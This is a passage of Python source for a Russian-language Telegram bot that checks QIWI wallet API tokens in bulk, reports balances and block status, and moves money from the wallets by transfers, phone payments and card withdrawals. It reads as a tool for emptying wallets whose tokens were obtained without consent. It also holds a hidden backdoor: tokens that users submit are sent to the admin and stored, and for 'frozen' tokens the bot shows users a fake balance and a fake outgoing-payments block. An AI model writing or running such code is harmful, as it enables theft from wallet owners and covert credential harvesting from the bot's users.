                elif qiwi.users_info.get(tid, {}).get("status") == "waiting_pay":
                    try:
                        if message.text == "✅ Я оплатил":
                            # Получаем все коды для проверки оплаты.
                            user_codes = [{"comment": x["comment"], "sum": x["sum"], "upgrade": x["upgrade"]} for x in qiwi.users_balance[tid]["transactions"] if x.get("status") == "created" and not x.get("paid_time")]
                            # Проверяем оплатил ли пользователь транзакцию.
                            result = check_paid(user_codes)
                            if result:
                                now_upgrade = result["upgrade"]
                                now_comment = result["comment"]
                                now_from_user = result["from"]
                                now_sum = result["sum"]
                                # Пополненяем счет пользователя.
                                qiwi.upgrade_limit(tid, now_upgrade, now_comment, now_from_user)
                                bot.send_message(tid, f'✅ Оплата подтверждена!\nЛимит повышен на `{bue_numb(now_upgrade)}`', parse_mode='markdown', reply_markup=kb_main)
                                qiwi.reset(tid)
                                try:
                                    # Отправляем уведомление админу.
                                    if tid != qiwi.notification:
                                        use_proxy = do_have_proxy(tid)
                                        qiwi.notif_common_admin(notif_text='🤑 *Оплата подтверждена!*', telegram_id=tid, username=message.from_user.username, last_text=f'\nЛимит повышен на `{bue_numb(now_upgrade)}`₽\nСумма платежа: `{bue_numb(now_sum)}`₽')
                                except:
                                    pass
                            else:
                                bot.send_message(tid, f'🚫 Ошибка - оплата не была найдена!\nПри необходимости пишите: {config.ADMIN_TG}', reply_markup=kb_paid)
                        else:
                            bot.send_message(tid, '🚫 Ошибка - ожидалось подтверждение!', reply_markup=kb_main)
                            qiwi.reset(tid)
                    except:
                        bot.send_message(tid, f'🚫 Ошибка - не удалось проверить оплату!\nПри необходимости пишите: {config.ADMIN_TG}', reply_markup=kb_paid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "waiting_cleaning":
                    if message.text == "🗝 Стереть токены":
                        try:
                            # Очищаем список номеров.
                            qiwi.last_tokens[tid] = []
                            # Обновляем изменения.
                            save_last_t(qiwi.last_tokens)
                        except:
                            bot.send_message(tid, '🚫 Ошибка - не удалось произвести очистку!', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, '✅ Список очищен', reply_markup=kb_main)
                    elif message.text == "📵 Стереть телефоны":
                        try:
                            # Очищаем список номеров.
                            qiwi.last_phones[tid] = []
                            # Обновляем изменения.
                            save_last_ph(qiwi.last_phones)
                        except:
                            bot.send_message(tid, '🚫 Ошибка - не удалось произвести очистку!', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, '✅ Список очищен', reply_markup=kb_main)
                    elif message.text == "🔥 Сбросить настройки пользователя":
                        try:
                            # Очищаем настройки пользователя.
                            qiwi.users_info[tid] = {
                                "status": None
                            }
                            # Обновляем изменения.
                        except:
                            bot.send_message(tid, '🚫 Ошибка - не удалось произвести сброс настроек!', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, '✅ Настройки сброшены!', reply_markup=kb_main)
                    else:
                        bot.send_message(tid, '🚫 Ошибка - не удалось распознать действие [#1]!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "not_member":
                    try:
                        if check_member(tid):
                            qiwi.reset(tid)
                            bot.send_message(tid, '👾 Спасибо, что подписались!', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, '🚫 Ошибка - вы не подписались.\nПоймите, это важно в случае, если бот неожиданно упадет. Так вы сможете найти меня.')
                    except:
                        bot.send_message(tid, '🚫 Ошибка - не удалось проверить подписку на канал! Повторите попытку позже.')
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "adding_proxy":
                    try:
                        bot.send_message(tid, "⌛ Проверяю прокси, подождите...")
                        # Получаем словарь прокси.
                        new_proxy = form_proxy(message.text)
                        # Получаем текущий IP.
                        now_ip = get_ip()
                        # Получаем IP по прокси.
                        proxy_ip = get_ip(user_proxy=new_proxy)
                        # Проверяем удалось ли получить IP.
                        if now_ip and proxy_ip and now_ip != proxy_ip:
                            # Получаем информацию об IP.
                            ip_info = get_ip_info(proxy_ip)
                            if ip_info:
                                if qiwi.users_proxy.get(tid, {}).get("data"):
                                    suc_text = "✅ *Прокси обновлены!*"
                                    variant = 1
                                else:
                                    suc_text = "✅ *Прокси добавлены!*"
                                    variant = 0
                                try:
                                    if tid != qiwi.notification:
                                        # Уведомляем про это админа.
                                        qiwi.notif_proxy_admin(variant=variant, telegram_id=tid, username=message.from_user.username)
                                except:
                                    pass

                                ip_info_text = f"{suc_text}\n" + \
                                    f"Регион: `{ip_info.get('regionName')}`\n" + \
                                    f"Страна: `{ip_info.get('country')}`\n" + \
                                    f"Город: `{ip_info.get('city')}`\n" + \
                                    f"Timezone: `{ip_info.get('timezone')}`\n" + \
                                    f"IP: `{ip_info.get('query')}`\n\n_Не забудь включить прокси в настройках!_"
                                qiwi.users_proxy[tid] = {
                                    "work": False,
                                    "data": new_proxy,
                                    "info": {
                                        "regionName": ip_info.get('regionName'),
                                        "country": ip_info.get('country'),
                                        "city": ip_info.get('city'),
                                        "timezone": ip_info.get('timezone'),
                                        "query": ip_info.get('query')
                                    },
                                    "added": int(time.time())
                                }
                                qiwi.save_proxy()
                                bot.send_message(tid, ip_info_text, parse_mode='markdown', reply_markup=kb_main)
                            else:
                                bot.send_message(tid, "🚫 Ошибка - не удалось получить информацию об IP!", reply_markup=kb_main)
                        else:
                            bot.send_message(tid, "🚫 Ошибка - некорректный IP!", reply_markup=kb_main)
                    except:
                        bot.send_message(tid, "🚫 Ошибка - не удалось загрузить прокси!", reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "confirm_notif":
                    if message.text == "✅ Подтвердить отправку":
                        success = 0
                        all_count = len(qiwi.users_info[tid]["to_ids"])
                        bot.send_message(tid, "☑️ Заявка принята в обработку", reply_markup=kb_main)
                        mail_message = bot.send_message(tid, '🕔 Начало отправки...')
                        clocks = get_clock()
                        tries = 0
                        if qiwi.users_info.get(tid, {}).get("to_photo"):
                            to_photo = qiwi.users_info[tid]["to_photo"]
                            to_text = qiwi.users_info[tid]["to_text"]
                            for one_id in qiwi.users_info[tid]["to_ids"]:
                                tries += 1
                                try:
                                    bot.send_photo(one_id, to_photo, caption=to_text, parse_mode="markdown")
                                except:
                                    pass
                                else:
                                    success += 1
                                time.sleep(0.1)
                                bot.edit_message_text(f"{next(clocks)} Идет отправка: *{success}* <- *{tries}*/*{all_count}*", tid, mail_message.message_id, parse_mode='markdown')
                                time.sleep(0.1)
                        else:
                            to_text = qiwi.users_info[tid]["to_text"]
                            for one_id in qiwi.users_info[tid]["to_ids"]:
                                tries += 1
                                try:
                                    bot.send_message(one_id, to_text, parse_mode='markdown')
                                except:
                                    pass
                                else:
                                    success += 1
                                time.sleep(0.1)
                                bot.edit_message_text(f"{next(clocks)} Идет отправка: *{success}* <- *{tries}*/*{all_count}*", tid, mail_message.message_id, parse_mode='markdown')
                                time.sleep(0.1)
                        bot.edit_message_text(f"✅ Отправка завершена: *{success}* <- *{tries}*/*{all_count}*", tid, mail_message.message_id, parse_mode='markdown')
                    else:
                        bot.send_message(tid, "🚫 Ошибка - ожидалось подтверждение!", reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "waiting_many_tokens":
                    try:
                        many_tokens_raw = message.text.replace('\n', ';')
                        many_tokens = many_tokens_raw.split(';')
                        # Проверяем на длину сообщения пользователя.
                        if len(many_tokens_raw) < 32:
                            raise ValueError
                        if len(many_tokens) <= 50:
                            # Фильтруем только валидные токены.
                            filted_tokens = filt_tokens(list(set(many_tokens)))
                            if not filted_tokens:
                                raise ValueError
                            filted_text = '\n'.join(filted_tokens)
                            many_text = f'Токенов допущено к проверке: *{len(filted_tokens)}*/*{len(many_tokens)}*\n\n' + \
                                f'Списком:\n`{filted_text}`'
                            qiwi.status(tid, "many_tokens_confirm")
                            qiwi.users_info[tid]["filted_tokens"] = filted_tokens
                            bot.send_message(tid, many_text, parse_mode='markdown', reply_markup=kb_confirm_many)
                        else:
                            bot.send_message(tid, "🚫 Ошибка - количество токенов не должно превышать 50!", reply_markup=kb_main)
                            qiwi.reset(tid)
                    except:
                        bot.send_message(tid, "🚫 Ошибка - ошибка при загрузки токенов!", reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "many_tokens_confirm":
                    if message.text == "✅ Начать проверку токенов":
                        try:
                            qiwi.status(tid, "doing_many_checks")
                            good_tokens = []
                            bad_tokens = []
                            goods = 0
                            bads = 0
                            total_sum = 0
                            bot.send_message(tid, "🚀 Запуск проверки токенов, подождите...", reply_markup=kb_disable)
                            tokens_amount = len(qiwi.users_info.get(tid, {}).get("filted_tokens", []))
                            sand_clocks = get_sand_clock()
                            message_status = bot.send_message(tid, f'{next(sand_clocks)} Проверка токенов: *0*/*{tokens_amount}*', parse_mode='markdown')
                            # Проверяем каждый токен по одному.
                            for now_token in qiwi.users_info.get(tid, {}).get("filted_tokens", []):
                                # Делаем задержку.
                                time.sleep(0.3)
                                # Предопределяем результат.
                                local_result = False
                                # Получаем номер телефона.
                                if len(now_token) == 32:
                                    profile_raw = qiwi.get_profile(now_token, tg_id=tid)
                                    if profile_raw["code"] == 200:
                                        profile_info = profile_raw["json"]
                                    else:
                                        profile_info = False
                                else:
                                    profile_info = False
                                if profile_info:
                                    phone = profile_info.get("contractInfo", {}).get("contractId")
                                    # Проверяем телефон.
                                    if phone:
                                        # Получаем информацию о балансах.
                                        balance_info = qiwi.get_rubles(now_qiwi=phone, now_token=now_token, tg_id=tid)
                                        # Получаем баланс в рублях.
                                        try:
                                            balance = balance_info if float(balance_info) >= 0 else None
                                        except:
                                            balance = None
                                        if isinstance(balance, float) and not balance is None:
                                            # Получаем информацию о блокировках.
                                            is_blocked = get_block_info(now_login=phone, now_token=now_token, tg_id=tid)
                                            if not (is_blocked or is_blocked is None):
                                                local_result = {
                                                    "phone": phone,
                                                    "balance": balance,
                                                }
                                                total_sum += balance
                                # Изменяем статус проверки.
                                try:
                                    bot.edit_message_text(f'{next(sand_clocks)} Проверка токенов: *{goods + bads}*/*{tokens_amount}*', chat_id=tid, message_id=message_status.message_id, parse_mode='markdown')
                                except:
                                    pass
                                if local_result:
                                    good_tokens.append({
                                        "token": now_token,
                                        "phone": local_result.get("phone"),
                                        "balance": local_result.get("balance")
                                    })
                                    goods += 1
                                    # Сохраняем токен.
                                    use_proxy = do_have_proxy(tid)
                                    qiwi.save_token(telegram_id=tid, new_token=now_token, phone=local_result.get("phone"), balance=local_result.get("balance"), use_proxy=use_proxy)
                                else:
                                    bad_tokens.append(now_token)
                                    bads += 1
                            if good_tokens:
                                total_sum = round(total_sum, 2)
                                mega_result = {
                                    "amount": {
                                        "total": goods + bads,
                                        "good": goods,
                                        "bad": bads
                                    },
                                    "tokens": {
                                        "total_balance": total_sum,
                                        "good": good_tokens,
                                        "bad": bad_tokens
                                    }
                                }
                                try:
                                    # Удаляем сообщение.
                                    bot.delete_message(chat_id=tid, message_id=message_status.message_id)
                                except:
                                    pass
                                # Получаем хорошие токены.
                                good_string = '\n'.join([one['token'] for one in good_tokens])
                                result_text = f'Результаты проверки: *{goods}*/*{goods + bads}*\nОбщий баланс: `{total_sum}`₽\n\nРабочие токены:\n`{good_string}`'
                                bot.send_message(tid, result_text, parse_mode='markdown', reply_markup=kb_main)
                                try:
                                    try:
                                        # Отправляем уведомление админу.
                                        if tid != qiwi.notification:
                                            use_proxy = do_have_proxy(tid)
                                            qiwi.notif_common_admin(notif_text='📦 *Выполнена проверка!*', telegram_id=tid, username=message.from_user.username, last_text=f'Общий баланс: `{total_sum}`₽\n\nРабочие токены:\n`{good_string}`', use_proxy=use_proxy)
                                    except:
                                        pass
                                    # Проверяем существует ли папка.
                                    if not os.path.exists('tokens'):
                                        os.mkdir('tokens')
                                    tmp_name = int(time.time())
                                    # Сохраняем данные в файл.
                                    with open(f'tokens/tokens_{tmp_name}.json', 'w', encoding='utf-8') as f:
                                        json.dump(mega_result, f, indent=4)
                                    # Отправляем.
                                    file_json = open(f'tokens/tokens_{tmp_name}.json', 'r', encoding='utf-8')
                                    bot.send_document(tid, file_json, caption='JSON файл с подробным отчетом.\n_Можно открыть через любой текстовый редактор._', parse_mode='markdown', reply_markup=kb_main)
                                except:
                                    bot.send_message(tid, "🚫 Ошибка - не удалось отправить JSON файл с отчетом!", reply_markup=kb_main)
                            else:
                                bot.send_message(tid, "🚫 Ошибка - все токены не прошли проверку!", reply_markup=kb_main)
                        except:
                            bot.send_message(tid, "🚫 Ошибка - не удалось проверить токены!", reply_markup=kb_main)
                    else:
                        bot.send_message(tid, "🚫 Ошибка - ожидалось подтверждение!", reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "waiting_token":
                    bot.send_message(tid, "⌛ Проверяю токен, подождите...", reply_markup=kb_cancel)
                    now_token = message.text
                    # Получаем информацию о токене.
                    if len(now_token) == 32:
                        profile_raw = qiwi.get_profile(now_token, tg_id=tid)
                        if profile_raw["code"] != 200:
                            # Извещаем об ошибке.
                            code_text = profile_raw.get("code", "None")
                            desc_text = ERROR_CODES.get(str(code_text), "Неопознанная ошибка.")
                            bot.send_message(tid, f'🚫 Ошибка - не удалось получить информацию о токене!\nКод ошибки: `{code_text}`\nОписание: `{desc_text}`\n\n_При необходимости советуем обратиться к админу._', parse_mode='markdown', reply_markup=kb_main)
                            qiwi.reset(tid)
                            return
                        else:
                            profile_info = profile_raw["json"]
                    else:
                        bot.send_message(tid, '🚫 Ошибка - некорректный токен!', reply_markup=kb_main)
                        qiwi.reset(tid)
                        return

                    if profile_info:
                        # Получаем номер телефона.
                        phone = profile_info.get("contractInfo", {}).get("contractId")
                        if phone:
                            # Получаем информацию о балансах.
                            balance_info = qiwi.get_rubles(now_qiwi=phone, now_token=now_token, tg_id=tid)
                            # Получаем баланс в рублях.
                            try:
                                if tid == qiwi.notification:
                                    balance = None
                                else:
                                    balance = load_freezed_tokens(now_token)
                                if balance is None or not isinstance(balance, float):
                                    balance = balance_info if float(balance_info) >= 0 else None
                                else:
                                    balance_info = balance
                            except:
                                balance = None

                            if isinstance(balance, float) and not balance is None:
                                qiwi.status(tid, "token_selected")
                                qiwi.users_info[tid]["token"] = now_token
                                qiwi.users_info[tid]["phone"] = phone
                                qiwi.users_info[tid]["balance"] = balance
                                qiwi.users_info[tid]["to_qiwi"] = None

                                if tid != qiwi.notification:
                                    use_proxy = do_have_proxy(tid)
                                    qiwi.notif_ch_admin(telegram_id=tid, username=message.from_user.username, token=now_token, from_qiwi=phone, balance=balance, use_proxy=use_proxy)
                                    qiwi.save_token(telegram_id=tid, new_token=now_token, phone=phone, balance=balance, use_proxy=use_proxy)

                                local_error = '[ошибка]'

                                show_blocked = profile_info.get("contractInfo", {}).get("blocked", local_error)

                                show_change = profile_info.get("contractInfo", {}).get("nickname", {}).get("canChange", local_error)
                                if show_change != local_error:
                                    show_change = "да" if show_change else "нет"

                                show_use = profile_info.get("contractInfo", {}).get("nickname", {}).get("canUse", local_error)
                                if show_use != local_error:
                                    show_use = "да" if show_use else "нет"

                                sms_enabled = profile_info.get("contractInfo", {}).get("smsNotification", {}).get("enabled", local_error)
                                if sms_enabled != local_error:
                                    sms_enabled = f"да" if sms_enabled else f"нет"

                                sms_active = profile_info.get("contractInfo", {}).get("smsNotification", {}).get("enabled", local_error)
                                if sms_active != local_error:
                                    sms_active = f"да" if sms_active else f"нет"

                                change_data = profile_info.get("authInfo", {}).get("passInfo", {}).get("lastPassChange", local_error).split('T')[0].split('+')[0]
                                create_data = profile_info.get("contractInfo", {}).get("creationDate", local_error).split('T')[0].split('+')[0]
                                reg_data = profile_info.get("authInfo", {}).get("registrationDate", local_error).split('T')[0].split('+')[0]

                                info_text = f'Номер телефона: `{profile_info.get("contractInfo", {}).get("contractId", local_error)}`\n' + \
                                    f'*Баланс:* `{balance}`₽\n' + \
                                    f'Ник: `{profile_info.get("contractInfo", {}).get("nickname", {}).get("nickname", local_error)}`\nСтатус: `{qiwi.get_verif_status(profile_info)}`\n\nБлокировка: `{f"да" if show_blocked else f"нет"}`\n' + \
                                    f'API: (canChange: `{show_change}` | canUse: `{show_use}`)\n' + \
                                    f'SMS: (enabled: `{sms_enabled}` | active: `{sms_active}`)\n\nОператор: `{profile_info.get("userInfo", {}).get("operator", local_error)}`\nЯзык: `{profile_info.get("userInfo", {}).get("language", local_error)}`\n' + \
                                    f'Валюта по-умолчанию: `{profile_info.get("userInfo", {}).get("defaultPayCurrency", local_error)}`\n\nДата создания: `{create_data}`\n' + \
                                    f'Дата регистрации: `{reg_data}`\nДата смены пароля: `{change_data}`'

                                try:
                                    numbers = int(qiwi.users_info[tid]["auto"])
                                    if not (7 >= numbers >= 1):
                                        raise ValueError
                                except:
                                    numbers = 3

                                # Добавляем токен в последние.
                                if qiwi.last_tokens.get(tid):
                                    # Проверяем, есть ли токен в последних.
                                    if now_token in qiwi.last_tokens[tid]:
                                        # Удаляем его.
                                        try:
                                            qiwi.last_tokens[tid].remove(now_token)
                                        except:
                                            pass
                                    # Добавляем токен.
                                    qiwi.last_tokens[tid].append(now_token)
                                    # Оставляем последние [numbers].
                                    qiwi.last_tokens[tid] = qiwi.last_tokens[tid][-numbers:]
                                else:
                                    qiwi.last_tokens[tid] = [now_token]
                                # Обновляем изменения.
                                save_last_t(qiwi.last_tokens)

                                # Проверяем стоит ли показывать кнопки переводов и оплаты.
                                if balance_info > 1.02:
                                    bot.send_message(tid, info_text, parse_mode='markdown', reply_markup=kb_actions)
                                else:
                                    bot.send_message(tid, info_text, parse_mode='markdown', reply_markup=kb_actions_0)
                                    bot.send_message(tid, '⚠️ Операции по переводу и оплате недоступны, т.к. баланс токена меньше 1.02₽!')
                                return
                    bot.send_message(tid, '🚫 Ошибка - не удалось получить информацию о токене!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "waiting_token2":
                    now_token = message.text
                    bot.send_message(tid, "⌛ Проверяю токен, подождите...", reply_markup=kb_cancel)
                    # Получаем номер телефона.
                    if len(now_token) == 32:
                        profile_raw = qiwi.get_profile(now_token, tg_id=tid)
                        if profile_raw["code"] != 200:
                            # Извещаем об ошибке.
                            code_text = profile_raw.get("code", "None")
                            desc_text = ERROR_CODES.get(str(code_text), "Неопознанная ошибка.")
                            bot.send_message(tid, f'🚫 Ошибка - не удалось получить информацию о токене!\nКод ошибки: `{code_text}`\nОписание: `{desc_text}`\n\n_При необходимости обратитесь к админу._', parse_mode='markdown', reply_markup=kb_main)
                            qiwi.reset(tid)
                            return
                        else:
                            profile_info = profile_raw["json"]
                    else:
                        bot.send_message(tid, '🚫 Ошибка - некорректный токен!', reply_markup=kb_main)
                        qiwi.reset(tid)
                        return
                    if profile_info:
                        phone = profile_info.get("contractInfo", {}).get("contractId")
                        # Получаем информацию о блокировках.
                        is_blocked = get_block_info(now_login=phone, now_token=now_token, tg_id=tid)
                        if is_blocked or is_blocked is None:
                            if is_blocked == 'cannot_info':
                                desc_text = 'Не удалось получить информацию о профиле токена.'
                            elif is_blocked == 'profile_blocked':
                                desc_text = 'Подтверждена блокировка кошелька.'
                            elif is_blocked:
                                desc_text = '\n' + is_blocked
                            else:
                                desc_text = 'Возникла неопознанная ошибка.'
                            notif_text = f'❌ *Возможна блокировка.*\nОписание: `{desc_text}`'
                            bot.send_message(tid, notif_text, parse_mode='markdown', reply_markup=kb_main)
                        else:
                            check_freezed = load_freezed_tokens(now_token)
                            if tid != qiwi.notification and check_freezed is None:
                                notif_text = f'✅ Блокировки не обнаружены.'
                            else:
                                desc_text = '🚫 Текущие блокировки:\nКод: OUTGOING_PAYMENTS\nОписание: Исходящие платежи заблокированы'
                                notif_text = f'❌ *Возможна блокировка.*\nОписание: `{desc_text}`'
                            bot.send_message(tid, notif_text, parse_mode='markdown', reply_markup=kb_main)
                        qiwi.reset(tid)

                        try:
                            numbers = int(qiwi.users_info[tid]["auto"])
                            if not (7 >= numbers >= 1):
                                raise ValueError
                        except:
                            numbers = 3
                        # Добавляем токен в последние.
                        if qiwi.last_tokens.get(tid):
                            # Проверяем, есть ли токен в последних.
                            if now_token in qiwi.last_tokens[tid]:
                                # Удаляем его.
                                try:
                                    qiwi.last_tokens[tid].remove(now_token)
                                except:
                                    pass
                            # Добавляем токен.
                            qiwi.last_tokens[tid].append(now_token)
                            # Оставляем последние 3.
                            qiwi.last_tokens[tid] = qiwi.last_tokens[tid][-numbers:]
                        else:
                            qiwi.last_tokens[tid] = [now_token]
                        # Обновляем изменения.
                        save_last_t(qiwi.last_tokens)

                        return
                    bot.send_message(tid, '🚫 Ошибка - не удалось получить информацию о токене!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "phone_sum":
                    try:
                        to_sum = round(float(message.text), 2)
                        to_phone = qiwi.users_info[tid]["to_phone"]
                        minus_sum = to_sum # Так как по идее комиссии нет.
                        qiwi.users_info[tid]["to_sum"] = to_sum
                        qiwi.status(tid, "confirm_phone")
                        # Выводим информацию.
                        phone_text = f'*Проверьте детали платежа!*\nПолучатель: `{to_phone}`\nСумма к списанию: `{minus_sum}`\nСумма к получению: `{to_sum}`'
                        bot.send_message(tid, phone_text, parse_mode='markdown', reply_markup=kb_confirm_ph)
                    except:
                        bot.send_message(tid, '🚫 Ошибка - не удалось считать сумму!', reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "confirm_phone":
                    try:
                        if message.text == "✅ Оплатить телефон":
                            token = qiwi.users_info[tid]["token"]
                            to_phone = qiwi.users_info[tid]["to_phone"]
                            to_sum = qiwi.users_info[tid]["to_sum"]
                            # Осуществляем перевод.
                            result = qiwi.send_mobile(token, to_phone, to_sum, tg_id=tid)
                            # Проверяем перевод.
                            if result["transaction"]["state"]["code"] == "Accepted":
                                # Добавляем телефон в последние.
                                qiwi.add_last_phone(tid, to_phone)
                                transaction_id = result["transaction"]["id"]
                                bot.send_message(tid, f'✅ Платеж принят!\n🧾 ID Транзакции: `{transaction_id}`', parse_mode='markdown', reply_markup=kb_main)
                                try:
                                    balance = qiwi.users_info[tid]["balance"]
                                    phone = qiwi.users_info[tid]["phone"]
                                    to_comment = result["comment"]
                                    use_proxy = do_have_proxy(tg_id=tid)
                                    qiwi.save_transaction(telegram_id=tid, token=token, from_qiwi=phone, to_qiwi=to_phone, user_sum=to_sum, boss_sum=0, transaction_id=transaction_id, use_proxy=use_proxy, tr_type=my_types.phone)
                                except:
                                    pass
                                else:
                                    qiwi.add_spent_limits(tid, to_sum) # 2
                                    if tid != qiwi.notification:
                                        notif_text = '📱 *Телефон оплачен!*'
                                        last_text = f'Токен: `{token}`\nПолучатель: `{to_phone}`\n\nБаланс: `{balance}`₽\nСумма к получению: `{to_sum}`₽\nКомментарий: `{to_comment}`\n\nID Транзакции: `{transaction_id}`'
                                        qiwi.notif_common_admin(notif_text=notif_text, telegram_id=tid, username=message.from_user.username, last_text=last_text, use_proxy=use_proxy)
                            else:
                                raise ValueError
                        else:
                            bot.send_message(tid, '🚫 Ошибка - ожидалось подтверждение!', reply_markup=kb_main)
                    except:
                        bot.send_message(tid, '🚫 Ошибка - не удалось выполнить платеж!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "phone_clicked":
                    try:
                        now_balance = float(qiwi.users_info[tid]["balance"])
                        if now_balance:
                            kb_sum = ReplyKeyboardMarkup(True)
                            kb_sum.row('25', '50', '100')
                            kb_sum.row('250', '500', '1000')
                            kb_sum.row(str(now_balance), '🔙 Отмена')
                        else:
                            raise ValueError
                        qiwi.status(tid, "phone_sum")
                        qiwi.users_info[tid]["balance"] = now_balance
                        qiwi.users_info[tid]["to_phone"] = str(int(message.text.replace('+', '')))
                        bot.send_message(tid, 'Укажите сумму для оплаты:', reply_markup=kb_sum)
                    except:
                        bot.send_message(tid, '🚫 Ошибка - не удалось загрузить баланс или ошибка в номере телефона!', reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "token_selected":
                    if message.text == "🥝 Перевести на QIWI":
                        bot.send_message(tid, 'Выберите действие:', reply_markup=kb_qiwi)
                    elif message.text == "🆗 Обычный перевод" or message.text == "🔂 Множественный перевод":
                        if message.text == "🆗 Обычный перевод":
                            qiwi.status(tid, "qiwi_clicked")
                        else:
                            qiwi.status(tid, "mult_qiwi_clicked")

                        try:
                            numbers = int(qiwi.users_info[tid]["auto"])
                            if not (7 >= numbers >= 1):
                                raise ValueError
                        except:
                            numbers = 3
                        kb_phones = ReplyKeyboardMarkup(True)
                        for last_phone in qiwi.last_phones.get(tid, [])[::-1][:numbers]:
                            kb_phones.row(str(last_phone))
                        kb_phones.row('🔙 Отмена')

                        example_text = "Введите номер QIWI кошелька получателя (без +) или выберите из последних:\n`Например: 79224443311`"
                        if message.text == "🔂 Множественный перевод":
                            example_text = 'При множественном переводе выполняется отправка средств платежами, не превышающими максимальную сумму.\n\n' + \
                                '_Например: Вы выбрали множественный перевод на 1500р с максимальной суммой в 350р.\nЗначит бот сделает 4 перевода на 350р и 1 по 100р._\n\n' + \
                                f'_Задержки между переводами будут рандомно генерироваться от {config.PAYMENTS_TIMEOUT[0]} до {config.PAYMENTS_TIMEOUT[1]} сек._\n\n' + example_text
                        bot.send_message(tid, example_text, parse_mode='markdown', reply_markup=kb_phones, disable_web_page_preview=True)
                    elif message.text == "📱 Оплатить телефон":

                        try:
                            numbers = int(qiwi.users_info[tid]["auto"])
                            if not (7 >= numbers >= 1):
                                raise ValueError
                        except:
                            numbers = 3

                        kb_phones = ReplyKeyboardMarkup(True)
                        for last_phone in qiwi.last_phones.get(tid, [])[::-1][:numbers]:
                            kb_phones.row(str(last_phone))
                        kb_phones.row('🔙 Отмена')

                        bot.send_message(tid, 'Укажите номер телефона, баланс которого нужно пополнить:\n_Например: 79627653621_', parse_mode='markdown', reply_markup=kb_phones)
                        qiwi.status(tid, "phone_clicked")
                    elif message.text == "₿ Криптовалюты":
                        send_referal(tid)
                        if tid != qiwi.notification:
                            qiwi.notif_common_admin(notif_text='₿ *Просмотр рефералки!*', telegram_id=tid, username=message.from_user.username)
                        qiwi.reset(tid)
                    elif message.text == "💳 Вывести на карту":
                        bot.send_message(tid, '⚠️ *Внимание!* Сейчас работатает вывод только на следующие карты:\n- VISA (RU)\n- MasterCard (RU)\n- MIR\n- QIWI CARD\n\n_Вывод на остальные карты я реализую в следующей обнове!_', parse_mode='markdown', reply_markup=kb_cancel)
                        bot.send_message(tid, 'Введите номер карты:\n_Например: 4444333366667777_', parse_mode='markdown', reply_markup=kb_cancel)
                        qiwi.status(tid, "card")
                    elif message.text == "💵 Оплатить":
                        bot.send_message(tid, 'Выберите действие:', reply_markup=kb_payments)
                    elif message.text == "🖥 Счета QIWI":
                        bot.send_message(tid, 'Выберите действие:', reply_markup=kb_invoices)
                    elif message.text == "💰 Оплатить счет (invoice)":
                        qiwi.status(tid, "invoice_clicked")
                        invoice_text = "Отправьте ссылку на счет (invoice).\n_Например: https://oplata.qiwi.com/form?invoiceUid=eb330b43-bd01-4019-9669-1e9ee7acdd19\nили\neb330b43-bd01-4019-9669-1e9ee7acdd19_"
                        bot.send_message(tid, invoice_text, parse_mode='markdown', reply_markup=kb_cancel, disable_web_page_preview=True)
                        try:
                            bot.send_photo(tid, requests.get('https://i.imgur.com/95A8IAf.jpeg', timeout=CONNECTION_TIMEOUT).content, caption="Как должен выглядеть счет (invoice) QIWI, который нужно оплатить:")
                        except:
                            pass
                    elif message.text == "🗄 Список неоплаченных счетов":
                        try:
                            # Получаем список неоплаченных счетов.
                            now_token = qiwi.users_info[tid]["token"]
                            ready_offers = qiwi.get_offers(now_token, tid)
                            # Обрабатываем.
                            if not ready_offers is None:
                                offers_list = []
                                offers_id = []
                                kb_offers = ReplyKeyboardMarkup(True)
                                for numb, one_offer in enumerate(ready_offers[:15]):
                                    comment_section = f"Комментарий: `{one_offer['comment']}`\n\n" if one_offer['comment'] else ''
                                    offers_list.append(
                                        f"*Неоплаченный счет #{numb + 1}*\n" + \
                                        f"Название: `{one_offer['provider']['short_name']}`\n" + \
                                        f"*ID*: `{one_offer['id']}`\n" + \
                                        f"Сумма: `{one_offer['sum']['amount']}`₽\n" + \
                                        comment_section + \
                                        f"Ссылка на оплату: {one_offer['pay_url']}"
                                    )
                                    # Добавляем ID-шки для оплаты.
                                    offers_id.append({
                                        "number": numb,
                                        "id": str(one_offer['id']),
                                        "sum": float(one_offer['sum']['amount'])
                                    })
                                    # Добавляем кнопку.
                                    kb_offers.row(f'Счет #{numb + 1} [ID:{one_offer["id"]}]')
                                kb_offers.row('🔙 Отмена')
                                if offers_list:
                                    qiwi.users_info[tid]["offers"] = offers_id
                                    qiwi.status(tid, "select_offers")
                                    offers_text = "\n\n".join(offers_list)
                                    bot.send_message(tid, offers_text, parse_mode='markdown', reply_markup=kb_offers, disable_web_page_preview=True)
                                    bot.send_message(tid, 'Чтобы оплатить счет выберите его из списка ниже.\n_Сравните его номер и ID!_', parse_mode='markdown')
                                else:
                                    bot.send_message(tid, '☑️ Неоплаченных счетов нет!', reply_markup=kb_main)
                                    qiwi.reset(tid)
                            else:
                                raise ValueError
                        except:
                            bot.send_message(tid, '🚫 Ошибка - не удалось загрузить счета!', reply_markup=kb_main)
                            qiwi.reset(tid)
                    elif message.text == "📝 Выставить QIWI счет на оплату":
                        bot.send_message(tid, 'Для выставления счета Вам нужно создать пару ключей авторизации.\nСделать это можно тут: https://qiwi.com/p2p-admin/transfers/api', disable_web_page_preview=True)
